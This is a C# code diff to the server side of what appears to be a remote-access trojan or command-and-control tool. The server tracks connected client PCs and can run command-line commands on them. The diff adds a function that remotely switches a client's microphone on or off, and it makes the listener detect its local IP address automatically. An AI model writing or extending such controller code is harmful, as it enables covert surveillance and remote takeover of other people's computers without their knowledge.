@@ -13,6 +13,9 @@ public static class ServerFunctions
     public static Form1 Parent;
     public static Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
     public static List<Client> Clients = new List<Client>();
+    public static IPEndPoint MainPoint;
+    public static IPAddress LocalAddress;
+    public static short MainPort = 1420;
     public static bool Running = true;
     public static bool InWork = false;
     public static void WaitForConnection() 
@@ -47,8 +50,37 @@ public static class ServerFunctions
 
     public static void BindSocket()
     {
-        ServerSocket.Bind(new IPEndPoint(IPAddress.Parse("192.168.0.17"), 1420));
+        LocalAddress = null;
+        var host = Dns.GetHostEntry(Dns.GetHostName());
+        foreach (var ip in host.AddressList)
+        {
+            if (ip.AddressFamily == AddressFamily.InterNetwork)
+            {
+                LocalAddress = ip;
+                break;
+            }
+        }
+        if(LocalAddress == null)
+        {
+            Console.WriteLine("Could not bind local ip...");
+            Console.ReadKey();
+            Environment.Exit(0);
+            return;
+        }
+        MainPoint = new IPEndPoint(LocalAddress, MainPort);
+        ServerSocket.Bind(MainPoint);
         ServerSocket.Listen(2);
+    }
+
+    public static void Microphone(Client client, bool value)
+    {
+        if(client == null)
+        {
+            Console.WriteLine("Select a valid client");
+            return;
+        }
+        byte[] buffer = new byte[2] { 5, value ? (byte)1 : (byte)0 };
+        send(client, buffer);
     }
     public static void RunCmdCommand(Client client, string command)
     {
@@ -216,8 +248,12 @@ public static class ServerFunctions
         {
             Console.WriteLine(client.PCName + " disconnected.");
             Parent.ClientDisconnected(client);
-            client.Socket.Shutdown(SocketShutdown.Both);
-            client.Socket.Dispose();
+            try
+            {
+                client.Socket.Shutdown(SocketShutdown.Both);
+                client.Socket.Dispose();
+            }
+            catch (ObjectDisposedException) { }
             Clients.Remove(client);
             return false;
         }
